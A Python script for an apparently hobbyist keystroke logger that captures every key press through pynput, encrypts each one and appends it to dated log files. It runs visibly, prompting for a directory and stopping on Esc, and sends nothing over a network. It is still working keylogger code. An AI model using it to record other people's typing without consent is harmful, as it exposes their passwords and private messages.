import sys
import os
from datetime import datetime
from logsManager import LogsManager
from encrypt import encryptor


def get_log_directory():
    log_dir = input("Enter the directory path for storing logs: ").strip()
    if not log_dir:
        log_dir = os.path.join(os.path.dirname(__file__), "logs")
        print(f"No path provided, using default: {log_dir}")
    return log_dir


def on_keystroke(key, enc, logs_manager):
    timestamp = datetime.now().strftime("%Y-%m-%d")
    log_file = logs_manager.get_log_path(f"log_{timestamp}.enc")

    key_bytes = str(key).encode("utf-8")
    nonce, ciphertext = enc.encrypt_from_string(key_bytes)

    with open(log_file, "ab") as f:
        f.write(len(nonce).to_bytes(1, "big"))
        f.write(nonce)
        f.write(len(ciphertext).to_bytes(4, "big"))
        f.write(ciphertext)


def main():
    log_dir = get_log_directory()

    logs_manager = LogsManager(log_dir)
    logs_manager.create_log_dir()
    print(f"Logs directory ready: {logs_manager.log_dir}")

    key_path = os.path.join(logs_manager.log_dir, "secret.key")
    enc = encryptor(key_path)

    print("Keystroke listener starting...")
    print("Press Ctrl+C to stop.\n")

    from pynput.keyboard import Listener, Key

    def handle_key(key):
        if key == Key.esc:
            print("\nEsc pressed, stopping listener...")
            return False
        on_keystroke(key, enc, logs_manager)

    with Listener(on_press=handle_key) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            listener.stop()
            print("\nStopped.")


if __name__ == "__main__":
    main()

